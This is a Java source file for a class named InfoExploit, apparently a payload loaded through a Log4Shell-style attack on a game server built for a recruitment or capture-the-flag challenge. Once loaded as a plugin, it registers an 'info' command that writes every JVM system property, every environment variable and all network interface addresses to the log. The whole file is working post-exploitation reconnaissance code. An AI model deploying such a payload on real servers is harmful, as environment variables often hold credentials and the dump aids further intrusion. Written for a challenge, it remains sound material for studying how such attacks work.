package fr.thesmyler.log4shell.payloads;

import org.hallebarde.recrutement.api.Game;
import org.hallebarde.recrutement.api.Plugin;
import org.hallebarde.recrutement.api.PluginMetadata;
import org.hallebarde.recrutement.api.commands.CommandExecutor;

import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Map;
import java.util.logging.Logger;

public class InfoExploit implements Plugin {

    Logger logger;

    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        this.logger = logger;
        game.registerCommand("info", this::infoCommand, "Dump jvm info");
    }

    @Override
    public void onUnload(Game game) {

    }

    public void infoCommand(Game game, CommandExecutor executor, String... args) {
        logger.info("System properties:");
        for (Map.Entry<Object, Object> entry: System.getProperties().entrySet()) {
            this.logger.info("\t" + entry.getKey() + ": " + entry.getValue());
        }
        logger.info("Env variables:");
        logger.info("");
        for (Map.Entry<String ,String> entry : System.getenv().entrySet()) {
            this.logger.info("\t" + entry.getKey() + ": " + entry.getValue());
        }
        logger.info("");
        logger.info("Network interfaces:");
        try {
            for (NetworkInterface iface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                logger.info("\tDisplay name: " + iface.getDisplayName());
                logger.info("\tName: " + iface.getName());
                for (InterfaceAddress address : iface.getInterfaceAddresses()) {
                    logger.info("\tAddress: " + address + "/" + address.getNetworkPrefixLength());
                }
                logger.info("");
            }
        } catch (Exception e) {
            logger.severe("Error when listing interfaces.");
        }
    }

}
